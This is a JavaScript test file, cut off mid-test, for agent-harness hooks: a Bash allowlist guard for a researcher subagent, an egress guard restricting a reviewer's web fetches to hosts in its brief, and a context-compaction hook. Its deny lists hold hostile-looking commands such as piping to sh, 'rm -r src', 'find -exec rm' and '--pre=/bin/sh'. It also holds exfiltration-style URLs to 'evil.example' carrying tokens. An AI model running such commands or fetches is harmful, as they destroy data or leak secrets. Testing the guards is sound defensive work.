// Slice e-guards: the researcher Bash guard, the reviewer egress guard and the compact-context hook, run as child
// processes with fixture state and transcripts (no model call), plus their pure parts imported directly.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { launchRecord, stopRecord } from "../.claude/hooks/brief.mjs";
import { researcherViolation } from "../.claude/hooks/researcher-guard.mjs";
import { agentTranscript, allowedHosts, egressDecision, hostOf } from "../.claude/hooks/egress-guard.mjs";
import { MAX_CONTEXT, runContext } from "../.claude/hooks/compact-context.mjs";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const hook = (/** @type {string} */ name) => join(root, ".claude", "hooks", name);
const RESEARCHER = hook("researcher-guard.mjs");
const EGRESS = hook("egress-guard.mjs");
const COMPACT = hook("compact-context.mjs");

const scratch = mkdtempSync(join(tmpdir(), "guards-test-"));
process.on("exit", () => rmSync(scratch, { recursive: true, force: true }));
const project = join(scratch, "project");
const stateDir = join(project, ".claude", "state");
mkdirSync(stateDir, { recursive: true });

const baseEnv = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith("ORCH_") && k !== "CLAUDE_PLUGIN_DATA"));
const env = (/** @type {Record<string, string>} */ extra = {}) => ({ ...baseEnv, CLAUDE_PROJECT_DIR: project, CLAUDE_PLUGIN_DATA: join(scratch, "plugin-data"), ...extra });

/** @param {string} script @param {unknown} input @param {Record<string, string>} [extra] */
function run(script, input, extra = {}) {
  const r = spawnSync(process.execPath, [script], { input: typeof input === "string" ? input : JSON.stringify(input), env: env(extra), cwd: project, encoding: "utf8" });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
}

/** No allow or ask decision anywhere in a hook's output (C6). @param {{ stdout: string }} r */
function noDecision(r) {
  assert.doesNotMatch(r.stdout, /permissionDecision|"decision"\s*:\s*"(allow|approve|ask)"/);
}

// ---- researcher guard ----

const ALLOWED = [
  "git log --oneline -5",
  "git log --format=\"%h <%ae>\" -3",
  "git -C /some/repo status --short",
  "git -C ../other show HEAD:README.md",
  "git branch --show-current",
  "git ls-files | wc -l",
  "git rev-parse HEAD && git rev-list --count HEAD",
  "ls -la src; du -sh .",
  "wc -l src/*.ts",
  // 1.2.0: read-only search and paging (the Grep and Glob tools are absent for an agent that also lists Bash).
  "grep -rn \"foo bar\" src --include='*.ts'",
  "grep -rnE 'a|b' . --exclude-dir=node_modules -A 3 | head -20",
  "git ls-files | grep -c test",
  "grep -rl SubagentHandback .claude/hooks/",
  "tail --lines=5 a.txt",
  "head --bytes=100 a.txt | wc -c",
  "cat a.txt /dev/null",
  "grep --file=/dev/null x .",
  "rg -f/dev/null x .",
  "grep -rn foo . --include=*.ts --exclude-dir=node_*", // a glob in an option's value, not its name
  "ls src/*.ts README*",
  "rg -n --glob '*.mjs' tokenize .claude/hooks",
  "find . -name '*.md' -type f",
  "find src -maxdepth 2 -newer package.json | wc -l",
  "head -50 README.md",
  "tail -n 20 CHANGELOG.md",
  "cat package.json",
];
const DENIED = [
  ["cat > notes.md <<'EOF'\nhello\nEOF", /heredoc|redirection/],
  ["python3 -c 'print(1)'", /python3/],
  ["cd /tmp && ls", /`cd`/],
  ["git log | python3", /python3/],
  ["git ls-files | xargs cat", /xargs/],
  ["ls > out.txt", /redirection/],
  ["git log >> log.txt", /redirection/],
  ["wc -l < f", /redirection/],
  ["ls $(pwd)", /substitution/],
  ["ls `pwd`", /substitution/],
  ["wc -l <(git ls-files)", /substitution/],
  ["X=1 ls", /assignment/],
  ["ls $HOME", /expansion/],
  ["git log --output=out.txt", /--output/],
  ["git branch -D main", /`git`/],
  ["git -c core.pager=sh log", /`git`/],
  ["git push origin main", /`git`/],
  ["f() { ls; }; f", /function|`f`/],
  ["ls 'unterminated", /cannot be read/],
  ["git log\nrm -r src", /`rm`/],
  // Review GAP 30: an escaped quote hid this heredoc from the quote-stripping regex.
  ["ls \\'<<X\n${x:=y}'\nX", /heredoc/],
  ["ls <<<'text'", /here-string|heredoc/],
  ["git log | wc -l <<X\nx\nX", /heredoc/],
  ["ls \\'<f \\'", /redirection/],
  // 1.2.0: the search and paging commands, in the forms that write a file, run a program or never end.
  ["find . -name '*.tmp' -delete", /find -delete/],
  ["find . -type f -exec rm {} +", /find -exec/],
  ["find . -fprint out.txt", /find -fprint/],
  ["grep --filter='gz:zcat' foo .", /grep --filter/],
  ["grep --pager=less foo .", /grep --pager/],
  ["grep ---myconf foo .", /not an allowed option/],
  ["rg --pre cat foo", /rg --pre/],
  ["tail -f log.txt", /never ends/],
  ["tail --follow=name log.txt", /tail --follow is not an allowed option/],
  // Review of 2026-11-10: a lone `--` can be the value of an option, so it never ends the check.
  ["rg -e -- --pre=/bin/sh foo .", /rg --pre/],
  ["rg --regexp -- --pre=sh x .", /rg --pre/],
  ["grep -e -- --filter=sh foo .", /grep --filter/],
  ["grep -c -- --filter notes.md", /grep --filter/], // harmless, refused all the same: the price of that rule
  // ripgrep's -z starts decompression programs; ugrep's -Q opens an interactive screen.
  ["rg -z foo .", /-z starts decompression/],
  ["rg -nz foo .", /-z starts decompression/],
  ["rg --search-zip foo .", /rg --search-zip/],
  ["grep -Q foo", /-Q opens an interactive screen/],
  // tail's historic syntax and GNU's shortened long options also follow.
  ["tail -5f a.txt", /never ends/],
  ["tail -F a.txt", /never ends/],
  ["tail --fol a.txt", /tail --fol is not an allowed option/],
  ["tail --retry a.txt", /tail --retry/],
  // bfs's own name for -delete, and devices that never end.
  ["find . -name '*.tmp' -rm", /find -rm/],
  ["cat /dev/zero", /device that may never end/],
  ["head /dev/urandom", /device that may never end/],
  ["grep x /dev/zero", /device that may never end/],
  ["tail /dev/zero", /device that may never end/],
  // A device attached to an option is read all the same.
  ["grep --file=/dev/zero x", /device that may never end/],
  ["rg -f/dev/urandom x", /device that may never end/],
  ["grep -rf/dev/urandom x .", /device that may never end/],
  ["tail --lines=5 --verbose=/dev/zero", /device that may never end/],
  // A glob in an option's name expands to whatever option a file of that name spells (`-?` to `-f`, `-delet[e]` to -delete).
  ["tail -? log.txt", /glob in an option/],
  ["find . -delet[e]", /glob in an option/],
  ["find . -de*", /glob in an option/],
  ["rg --glob* x .", /glob in an option/],
  ["git log -?", /glob in an option/],
  // The denial says how to write it instead: quote the glob or use the long form.
  ["rg -g*.md x", /quote the glob \(`rg -g '\*\.md' x`\) or use the long form \(`--glob=\*\.md`\)/],
  ["grep -e -* f", /quote the glob/],
  ["grep foo . > out.txt", /redirection/],
  ["cat a.txt | sh", /`sh`/],
  ["/usr/bin/grep foo .", /not an allowed command/],
  ["sed -n 1,5p a.txt", /`sed`/],
];

test("researcher guard: allowlisted commands pass", () => {
  for (const c of ALLOWED) assert.equal(researcherViolation(c), null, c);
});

test("researcher guard: everything else is denied with a reason", () => {
  for (const [c, re] of DENIED) {
    const v = researcherViolation(/** @type {string} */ (c));
    assert.ok(v, `expected a denial for ${JSON.stringify(c)}`);
    assert.match(v.reason, /** @type {RegExp} */ (re), String(c));
  }
});

// The decision the guard gave each command at commit 525e464, before its denial messages gained hints. Literal values,
// so a change to the messages (or to the lists above) cannot move what is allowed or denied without failing here.
// Every command the tests in this file use, plus forms researchers were refused in real use.
const DECISIONS = /** @type {[string, "allow" | "deny"][]} */ ([
  ["git log --oneline -5", "allow"],
  ["git log --format=\"%h <%ae>\" -3", "allow"],
  ["git -C /some/repo status --short", "allow"],
  ["git -C ../other show HEAD:README.md", "allow"],
  ["git branch --show-current", "allow"],
  ["git ls-files | wc -l", "allow"],
  ["git rev-parse HEAD && git rev-list --count HEAD", "allow"],
  ["ls -la src; du -sh .", "allow"],
  ["wc -l src/*.ts", "allow"],
  ["grep -rn \"foo bar\" src --include='*.ts'", "allow"],
  ["grep -rnE 'a|b' . --exclude-dir=node_modules -A 3 | head -20", "allow"],
  ["git ls-files | grep -c test", "allow"],
  ["grep -rl SubagentHandback .claude/hooks/", "allow"],
  ["tail --lines=5 a.txt", "allow"],
  ["head --bytes=100 a.txt | wc -c", "allow"],
  ["cat a.txt /dev/null", "allow"],
  ["grep --file=/dev/null x .", "allow"],
  ["rg -f/dev/null x .", "allow"],
  ["grep -rn foo . --include=*.ts --exclude-dir=node_*", "allow"],
  ["ls src/*.ts README*", "allow"],
  ["rg -n --glob '*.mjs' tokenize .claude/hooks", "allow"],
  ["find . -name '*.md' -type f", "allow"],
  ["find src -maxdepth 2 -newer package.json | wc -l", "allow"],
  ["head -50 README.md", "allow"],
  ["tail -n 20 CHANGELOG.md", "allow"],
  ["cat package.json", "allow"],
  ["cat > notes.md <<'EOF'\nhello\nEOF", "deny"],
  ["python3 -c 'print(1)'", "deny"],
  ["cd /tmp && ls", "deny"],
  ["git log | python3", "deny"],
  ["git ls-files | xargs cat", "deny"],
  ["ls > out.txt", "deny"],
  ["git log >> log.txt", "deny"],
  ["wc -l < f", "deny"],
  ["ls $(pwd)", "deny"],
  ["ls `pwd`", "deny"],
  ["wc -l <(git ls-files)", "deny"],
  ["X=1 ls", "deny"],
  ["ls $HOME", "deny"],
  ["git log --output=out.txt", "deny"],
  ["git branch -D main", "deny"],
  ["git -c core.pager=sh log", "deny"],
  ["git push origin main", "deny"],
  ["f() { ls; }; f", "deny"],
  ["ls 'unterminated", "deny"],
  ["git log\nrm -r src", "deny"],
  ["ls \\'<<X\n${x:=y}'\nX", "deny"],
  ["ls <<<'text'", "deny"],
  ["git log | wc -l <<X\nx\nX", "deny"],
  ["ls \\'<f \\'", "deny"],
  ["find . -name '*.tmp' -delete", "deny"],
  ["find . -type f -exec rm {} +", "deny"],
  ["find . -fprint out.txt", "deny"],
  ["grep --filter='gz:zcat' foo .", "deny"],
  ["grep --pager=less foo .", "deny"],
  ["grep ---myconf foo .", "deny"],
  ["rg --pre cat foo", "deny"],
  ["tail -f log.txt", "deny"],
  ["tail --follow=name log.txt", "deny"],
  ["rg -e -- --pre=/bin/sh foo .", "deny"],
  ["rg --regexp -- --pre=sh x .", "deny"],
  ["grep -e -- --filter=sh foo .", "deny"],
  ["grep -c -- --filter notes.md", "deny"],
  ["rg -z foo .", "deny"],
  ["rg -nz foo .", "deny"],
  ["rg --search-zip foo .", "deny"],
  ["grep -Q foo", "deny"],
  ["tail -5f a.txt", "deny"],
  ["tail -F a.txt", "deny"],
  ["tail --fol a.txt", "deny"],
  ["tail --retry a.txt", "deny"],
  ["find . -name '*.tmp' -rm", "deny"],
  ["cat /dev/zero", "deny"],
  ["head /dev/urandom", "deny"],
  ["grep x /dev/zero", "deny"],
  ["tail /dev/zero", "deny"],
  ["grep --file=/dev/zero x", "deny"],
  ["rg -f/dev/urandom x", "deny"],
  ["grep -rf/dev/urandom x .", "deny"],
  ["tail --lines=5 --verbose=/dev/zero", "deny"],
  ["tail -? log.txt", "deny"],
  ["find . -delet[e]", "deny"],
  ["find . -de*", "deny"],
  ["rg --glob* x .", "deny"],
  ["git log -?", "deny"],
  ["rg -g*.md x", "deny"],
  ["grep -e -* f", "deny"],
  ["grep foo . > out.txt", "deny"],
  ["cat a.txt | sh", "deny"],
  ["/usr/bin/grep foo .", "deny"],
  ["sed -n 1,5p a.txt", "deny"],
  ["cat > x.py <<EOF\nprint(1)\nEOF", "deny"],
  ["python3 x.py", "deny"],
  ["cd src && ls", "deny"],
  ["git log --oneline | wc -l", "allow"],
  ["cd /x && grep -n foo a.txt", "deny"],
  ["grep foo a.txt | sort", "deny"],
  ["echo hi", "deny"],
  ["x=0; grep foo a.txt", "deny"],
  // b4: exactly `2>/dev/null` and `2>&1`, each a word of its own, are the only redirections allowed.
  ["grep foo a.txt 2>/dev/null", "allow"],
  ["ls -la /x 2>/dev/null", "allow"],
  ["grep -rn foo src 2>&1 | head -5", "allow"],
  ["ls /x 2>/dev/null && wc -l a.txt 2>/dev/null", "allow"],
  ["ls /x >/dev/null", "deny"],
  ["ls /x 1>/dev/null", "deny"],
  ["ls /x &>/dev/null", "deny"],
  ["ls /x 2>/dev/nullx", "deny"],
  ["ls /x 2>/dev/null.txt", "deny"],
  ["ls /x 2> /dev/null", "deny"],
  ["ls /x 2>file", "deny"],
  ["ls /x 2>>file", "deny"],
  ["ls /x >&2", "deny"],
  ["wc -l <file", "deny"],
  ["cat <<EOF\nx\nEOF", "deny"],
  ["cat <<<x", "deny"],
  ["ls /x 2>&1 >out", "deny"],
  ["ls /x 2>/dev/null>out", "deny"],
  ["ls /x 2>/dev/null;2>/dev/null ls", "deny"],
  ["2>/dev/null ls /x", "deny"],
  ["ls a\\ 2>/dev/null", "deny"],
  ["ls /x # 2>/dev/null", "deny"],
  ["ls $'\\' 2>/dev/null '", "deny"],
  ["ls '/x' 2>/dev/null \"a\" 2>&1", "allow"],
  ["ls $(ls 2>/dev/null)", "deny"],
  ["ls `ls 2>&1`", "deny"],
  ["ls /x 2>/dev/null; python3 x.py", "deny"],
  ["ls /x 2>&1 | sh", "deny"],
  ["wc -l /x/a.txt /x/b.txt", "allow"],
  ["wc -l /x/{a,b}.txt", "deny"],
]);

test("researcher guard: every recorded command keeps its allow or deny decision", () => {
  for (const [c, want] of DECISIONS) {
    /** @type {string | undefined} */
    let got;
    assert.doesNotThrow(() => {
      got = researcherViolation(c) ? "deny" : "allow";
    }, c);
    assert.equal(got, want, c);
  }
});

// A denial says what to use instead, and keeps its first words so the gate records still group.
const HINTS = [
  ["cd /x && grep -n foo a.txt", /^`cd` is not an allowed command; .*absolute paths/],
  ["cd src && ls", /^`cd` is not an allowed command; .*absolute paths/],
  ["sed -n 1,5p a.txt", /^`sed` is not an allowed command; .*Read tool with offset and limit.*`head` and `tail`/],
  ["awk 'NR<5' a.txt", /^`awk` is not an allowed command; .*Read tool with offset and limit.*`head` and `tail`/],
  ["grep foo a.txt | sort", /^`sort` is not an allowed command; .*grep, rg, find, head, tail, cat, ls, wc, du.*in the report/],
  ["uniq a.txt", /^`uniq` is not an allowed command; .*grep, rg, find.*in the report/],
  ["echo hi", /^`echo` is not an allowed command; .*grep, rg, find.*in the report/],
  ["printf hi", /^`printf` is not an allowed command; .*grep, rg, find.*in the report/],
  ["python3 x.py", /^`python3` is not an allowed command; .*grep, rg, find.*in the report/],
  ["x=0; grep foo a.txt", /^a variable assignment; .*grep, rg, find.*in the report/],
];

test("researcher guard: a refused command's reason says what to use instead, in one or two short sentences", () => {
  for (const [c, re] of HINTS) {
    const v = researcherViolation(/** @type {string} */ (c));
    assert.ok(v, String(c));
    assert.match(v.reason, /** @type {RegExp} */ (re), String(c));
    assert.ok(v.reason.split(/\. /).length <= 2 && v.reason.length <= 240, `short: ${v.reason}`);
  }
});


const bash = (/** @type {string} */ command, /** @type {string | null} */ agentType = "researcher") => ({
  session_id: "s-r", agent_id: "a-r", ...(agentType && { agent_type: agentType }), hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command },
});

test("researcher guard hook: exit 2 with the allowed prefixes for the session-6.5 cases, exit 0 silently for allowed", () => {
  for (const c of ["cat > x.py <<EOF\nprint(1)\nEOF", "python3 x.py", "cd src && ls"]) {
    for (const t of ["researcher", "orchestration:researcher"]) {
      const r = run(RESEARCHER, bash(c, t));
      assert.equal(r.code, 2, c);
      assert.match(r.stderr, /git log, git ls-files.*wc, ls, du/);
      assert.equal(r.stdout, "");
    }
  }
  const ok = run(RESEARCHER, bash("git log --oneline | wc -l"));
  assert.deepEqual([ok.code, ok.stdout, ok.stderr], [0, "", ""]);
  const gates = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).filter((g) => g.gate === "researcher");
  assert.ok(gates.length >= 6);
  for (const g of gates) {
    assert.deepEqual(Object.keys(g).sort(), ["agent_id", "decision", "gate", "reason", "session_id", "ts", "word"]);
    assert.doesNotMatch(JSON.stringify(g), /print\(1\)|x\.py/); // C7: never the command text
  }
});

test("researcher guard hook: other agent types, the main thread, ORCH_GUARDS=off and malformed input pass untouched", () => {
  for (const t of ["implementer", "reviewer", "orchestration:implementer", null]) {
    const r = run(RESEARCHER, bash("python3 x.py", t));
    assert.deepEqual([r.code, r.stdout], [0, ""], String(t));
  }
  const off = run(RESEARCHER, bash("python3 x.py"), { ORCH_GUARDS: "off" });
  assert.deepEqual([off.code, off.stdout, off.stderr], [0, "", ""]);
  for (const bad of ["", "not json", "null", "[]", JSON.stringify({ agent_type: "researcher", tool_input: {} }), JSON.stringify({ agent_type: "researcher", tool_name: "Read", tool_input: { command: "python3" } })]) {
    const r = run(RESEARCHER, bad);
    assert.deepEqual([r.code, r.stdout], [0, ""], bad);
  }
});

// ---- egress guard ----

const transcripts = join(scratch, "transcripts");
const SID = "sess-egress";
const mainTranscript = join(transcripts, `${SID}.jsonl`);
mkdirSync(join(transcripts, SID, "subagents", "workflows", "wf_1"), { recursive: true });
writeFileSync(mainTranscript, `${JSON.stringify({ type: "user", isSidechain: false, message: { role: "user", content: "see https://main-only.example/x" } })}\n`);
const userLine = (/** @type {string} */ content, /** @type {string} */ agentId) => `${JSON.stringify({ parentUuid: null, isSidechain: true, agentId, type: "user", message: { role: "user", content } })}\n`;
// Foreground (or background) Agent tool reviewer: the brief is its first user message, verbatim.
writeFileSync(
  join(transcripts, SID, "subagents", "agent-afg1.jsonl"),
  userLine("SLICE: s1\nCHECKS: C1\nC1: the doc cites https://www.Cited.example/spec.\nReview the change.", "afg1") +
    `${JSON.stringify({ type: "assistant", message: { content: "fetching https://evil.example" } })}\n`,
);
// Workflow agent(): the harness wraps the brief and indents every line.
writeFileSync(
  join(transcripts, SID, "subagents", "workflows", "wf_1", "agent-awf1.jsonl"),
  userLine("[Workflow harness — computed task] The task text below was computed at runtime by a workflow script. The computed task text follows:\n  SLICE: s2\n  Check https://wf.example/page against the code.", "awf1"),
);
// A reviewer of slice s1 whose brief names no URL: the planned files of s1 give the hosts.
writeFileSync(join(transcripts, SID, "subagents", "agent-afg2.jsonl"), userLine("SLICE: s1\nReview the change.", "afg2"));
mkdirSync(join(project, "docs"), { recursive: true });
writeFileSync(join(project, "docs", "links.md"), "Sources: https://files.example/ref and (https://www.second.example/a).\n");
const plan = "PLAN REVIEW\nCONSTRAINTS:\nC1: cite sources\nSLICE: s1\nFILES: docs/links.md, docs/missing.md\nDEPENDS: none\nGOAL: docs\n";
writeFileSync(join(stateDir, "journal-launches.jsonl"), `${JSON.stringify(launchRecord({ subagent_type: "reviewer", prompt: plan }, { sessionId: SID, agentId: "aplan" }))}\n`);

const fetchInput = (/** @type {string} */ url, /** @type {string} */ agentId, /** @type {string} */ agentType = "reviewer") => ({
  session_id: SID, transcript_path: mainTranscript, cwd: project, agent_id: agentId, agent_type: agentType, hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: { url, prompt: "summarize" },
});

test("egress guard: transcript location for foreground and workflow agents", () => {
  assert.equal(agentTranscript(mainTranscript, "afg1"), join(transcripts, SID, "subagents", "agent-afg1.jsonl"));
  assert.equal(agentTranscript(mainTranscript, "awf1"), join(transcripts, SID, "subagents", "workflows", "wf_1", "agent-awf1.jsonl"));
  assert.equal(agentTranscript(mainTranscript, "nope"), null);
  assert.equal(agentTranscript(mainTranscript, "../x"), null);
  assert.equal(hostOf("https://WWW.Example.COM/a"), "example.com");
  assert.equal(hostOf("not a url"), null);
});

test("egress guard: the port counts, the scheme's default port is normalised (b4)", () => {
  assert.equal(hostOf("https://a.example:443/x"), hostOf("https://a.example/"));
  assert.equal(hostOf("http://a.example:80/x"), hostOf("http://a.example/"));
  assert.notEqual(hostOf("https://a.example:8443/x"), hostOf("https://a.example/"));
  assert.equal(hostOf("https://WWW.A.example:8443/x"), "a.example:8443");
  const allowed = allowedHosts("see https://cited.example and http://alt.example:8080/doc", [], project);
  assert.ok(allowed.has(String(hostOf("https://cited.example:443/z"))));
  assert.ok(!allowed.has(String(hostOf("https://cited.example:8443/z"))));
  assert.ok(allowed.has(String(hostOf("http://alt.example:8080/other"))));
  assert.ok(!allowed.has(String(hostOf("http://alt.example/other"))));
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://cited.example:8443/x", "afg1"), o).decision, "deny");
  assert.equal(egressDecision(fetchInput("https://cited.example:443/x", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://files.example:444/x", "afg1"), o).decision, "deny");
});

test("egress guard: hosts from the brief allow, others deny (foreground reviewer)", () => {
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://cited.example/other/page", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://www.cited.example/spec", "afg1"), o).decision, "allow");
  // s1's planned files name files.example and second.example
  assert.equal(egressDecision(fetchInput("https://files.example/x", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://second.example/x", "afg2"), o).decision, "allow");
  const d = egressDecision(fetchInput("https://evil.example/?q=secret", "afg1"), o);
  assert.equal(d.decision, "deny");
  assert.match(String(d.reason), /evil\.example/);
  assert.doesNotMatch(String(d.reason), /secret/);
  // a URL only in the main transcript or the agent's later messages does not count
  assert.equal(egressDecision(fetchInput("https://main-only.example/x", "afg1"), o).decision, "deny");
  assert.equal(egressDecision(fetchInput("https://cited.example.evil.example/", "afg1"), o).decision, "deny");
});

test("egress guard: workflow-style reviewer brief, unverified brief, other agents", () => {
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://wf.example/other", "awf1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://files.example/x", "awf1"), o).decision, "deny"); // s2 is not planned
  assert.equal(egressDecision(fetchInput("https://any.example/", "agone"), o).decision, "unverified");
  assert.equal(egressDecision(fetchInput("https://any.example/", "afg1", "researcher"), o).decision, "skip");
  assert.equal(egressDecision(fetchInput("https://any.example/", "afg1"), { dir: stateDir, env: env({ ORCH_GUARDS: "off" }) }).decision, "skip");
});

test("egress guard hook: exit codes, gates.jsonl holds the host only, no decisions printed", () => {
  const allow = run(EGRESS, fetchInput("https://cited.example/x?token=abc", "afg1"));
  assert.deepEqual([allow.code, allow.stdout, allow.stderr], [0, "", ""]);
  const deny = run(EGRESS, fetchInput("https://evil.example/leak?token=abc", "afg1"));
  assert.equal(deny.code, 2);
  assert.match(deny.stderr, /evil\.example/);
  assert.equal(deny.stdout, "");
  const unv = run(EGRESS, fetchInput("https://any.example/p?token=abc", "agone"));
  assert.deepEqual([unv.code, unv.stdout], [0, ""]);
  const wf = run(EGRESS, fetchInput("https://www.wf.example/x", "awf1", "orchestration:reviewer"));
  assert.deepEqual([wf.code, wf.stdout], [0, ""]);
  const off = run(EGRESS, fetchInput("https://evil.example/", "afg1"), { ORCH_GUARDS: "off" });
  assert.deepEqual([off.code, off.stdout, off.stderr], [0, "", ""]);
  const other = run(EGRESS, fetchInput("https://evil.example/", "afg1", "implementer"));
  assert.deepEqual([other.code, other.stdout], [0, ""]);
  for (const bad of ["", "{", "null", JSON.stringify({ agent_type: "reviewer", tool_name: "WebFetch" })]) {
    const r = run(EGRESS, bad);
    assert.deepEqual([r.code, r.stdout], [0, ""], bad);
  }
  for (const r of [allow, deny, unv, wf, off, other]) noDecision(r);
  const gates = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).filter((g) => g.gate === "egress");
  assert.deepEqual(gates.map((g) => [g.decision, g.reason, g.host]), [
    ["allow", "host_in_brief", "cited.example"],
    ["deny", "host_not_in_brief", "evil.example"],
    ["allow", "egress_unverified", "any.example"],
    ["allow", "host_in_brief", "wf.example"],
  ]);
  const text = JSON.stringify(gates);
  assert.doesNotMatch(text, /token|leak|Review the change|https?:/); // C7: hosts only
});

// ---- compact context ----

test("compact-context: open run → SessionStart additionalContext with slices, files, states and constraints", () => {
  const sid = "sess-compact";
  const t0 = Date.now() - 60_000;
  const at = (/** @type {number} */ s) => new Date(t0 + s * 1000).toISOString();
  const bigPlan = "PLAN REVIEW\nCONSTRAINTS:\nC1: tests pass\nC2: no new dependencies\nSLICE: a\nFILES: src/a.ts\nDEPENDS: none\nGOAL: a\nSLICE: b\nFILES: src/b.ts, src/b.test.ts\nDEPENDS: a\nGOAL: b\nRISKY: yes\nSLICE: c\nFILES: src/c.ts\nDEPENDS: none\nGOAL: c\n";
  const launches = [
    launchRecord({ subagent_type: "reviewer", prompt: bigPlan }, { sessionId: sid, agentId: "p1", ts: at(0) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: a\nFILES: src/a.ts\nDEPENDS: none" }, { sessionId: sid, agentId: "i1", ts: at(2) }),
    launchRecord({ subagent_type: "reviewer", prompt: "SLICE: a" }, { sessionId: sid, agentId: "r1", ts: at(4) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: b\nFILES: src/b.ts, src/b.test.ts\nDEPENDS: a" }, { sessionId: sid, agentId: "i2", ts: at(6) }),
  ];
  const stops = [
    stopRecord({ sessionId: sid, agentId: "p1", role: "reviewer", slice: "plan", reply: "STATUS: pass", ts: at(1) }),
    stopRecord({ sessionId: sid, agentId: "i1", role: "implementer", slice: "a", reply: "STATUS: pass", ts: at(3) }),
    stopRecord({ sessionId: sid, agentId: "r1", role: "reviewer", slice: "a", reply: "STATUS: pass", ts: at(5) }),
  ];
  const dir = join(scratch, "compact-project");
  const sdir = join(dir, ".claude", "state");
  mkdirSync(sdir, { recursive: true });
  writeFileSync(join(sdir, "journal-launches.jsonl"), launches.map((l) => JSON.stringify(l)).join("\n") + "\n");
  writeFileSync(join(sdir, "journal.jsonl"), stops.map((l) => JSON.stringify(l)).join("\n") + "\n");
  // The project registers its own copy, so the hook (project copy, no --plugin) uses <project>/.claude/state.
  const r = spawnSync(process.execPath, [COMPACT], { input: JSON.stringify({ session_id: sid, hook_event_name: "SessionStart", source: "compact", cwd: dir }), env: { ...env(), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
  assert.equal(r.status, 0);
  const out = JSON.parse(r.stdout);
  assert.equal(out.hookSpecificOutput.hookEventName, "SessionStart");
  const ctx = out.hookSpecificOutput.additionalContext;
  assert.match(ctx, /- a: passed FILES: src\/a\.ts/);
  assert.match(ctx, /- b: building or reviewing \(1 attempt\), RISKY FILES: src\/b\.ts, src\/b\.test\.ts/);
  assert.match(ctx, /- c: pending FILES: src\/c\.ts/);
  assert.match(ctx, /C1: tests pass\nC2: no new dependencies/);
  assert.ok(ctx.length <= MAX_CONTEXT);
  noDecision(r);

  // Another session, a startup source and malformed input: silence.
  for (const input of [{ session_id: "other", source: "compact" }, { session_id: sid, source: "startup" }, "nope", "", { source: "compact" }]) {
    const q = spawnSync(process.execPath, [COMPACT], { input: typeof input === "string" ? input : JSON.stringify(input), env: { ...env(), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
    assert.deepEqual([q.status, q.stdout], [0, ""], JSON.stringify(input));
  }
});

test("compact-context: no state at all → silent; the context is capped", () => {
  const r = run(COMPACT, { session_id: "nobody", source: "compact" });
  assert.deepEqual([r.code, r.stdout, r.stderr], [0, "", ""]);
  const slices = Object.fromEntries(
    Array.from({ length: 60 }, (_, i) => [`slice-${i}`, { files: [`src/some/long/path/file-${i}.ts`], passed: false, gaveUp: false, attempts: 0, launches: 0, reviews: [], lastImplAt: null, risky: false }]),
  );
  const ctx = runContext({ id: 1, kind: "planned", planned: Object.keys(slices), slices, constraints: { C1: "x".repeat(300) }, planReviewed: true });
  assert.ok(ctx.length <= MAX_CONTEXT, String(ctx.length));
  assert.match(ctx, /- slice-0: pending/);
  assert.match(ctx, /\+\d+ more slices/);
  assert.ok(ctx.includes(`C1: ${"x".repeat(200)}\n`));
  assert.ok(ctx.endsWith("Every slice still needs a passing review before the final report."));
});

test("compact-context: with many slices the constraints and the final reminder survive the cap (b4)", () => {
  const slices = Object.fromEntries(
    Array.from({ length: 40 }, (_, i) => [`slice-${i}`, { files: [`src/some/long/path/file-${i}.ts`, `src/other/${i}.ts`], passed: i < 3, gaveUp: false, attempts: 0, launches: 0, reviews: [], lastImplAt: null, risky: false }]),
  );
  const constraints = Object.fromEntries(Array.from({ length: 5 }, (_, i) => [`C${i + 1}`, `${i}`.repeat(250)]));
  const ctx = runContext({ id: 7, kind: "planned", planned: Object.keys(slices), slices, constraints, planReviewed: true });
  assert.ok(ctx.length <= MAX_CONTEXT, String(ctx.length));
  assert.match(ctx, /^Orchestration run 7 is still open/);
  for (let i = 0; i < 5; i++) assert.ok(ctx.includes(`C${i + 1}: ${`${i}`.repeat(200)}\n`), `C${i + 1}`);
  assert.ok(ctx.endsWith("Every slice still needs a passing review before the final report."));
  const shown = (ctx.match(/^- slice-\d+/gm) ?? []).length;
  const more = Number(/\+(\d+) more slices/.exec(ctx)?.[1]);
  assert.ok(shown >= 1, String(shown));
  assert.equal(shown + more, 40);
  // a run that fits keeps every slice line whole, with no marker
  const small = runContext({ id: 8, kind: "planned", planned: ["a"], slices: { a: slices["slice-0"] }, constraints: { C1: "short" }, planReviewed: true });
  assert.match(small, /- a: passed FILES: src\/some\/long\/path\/file-0\.ts, src\/other\/0\.ts/);
  assert.doesNotMatch(small, /more slices|truncated/);
});

test("no hook source prints an allow or ask permission decision (C6)", () => {
  for (const f of ["researcher-guard.mjs", "egress-guard.mjs", "compact-context.mjs", "worktree-head.mjs", "skill-gate.mjs", "skill-seal.mjs"]) {
    if (!existsSync(hook(f))) continue;
    const src = readFileSync(hook(f), "utf8");
    assert.doesNotMatch(src, /permissionDecision|"ask"|decision:\s*"approve"/, f);
  }
});

test("plugin copies exit early on duplicate() when the project registers the same script (C4)", () => {
  const dup = join(scratch, "dup-project");
  mkdirSync(join(dup, ".claude", "hooks"), { recursive: true });
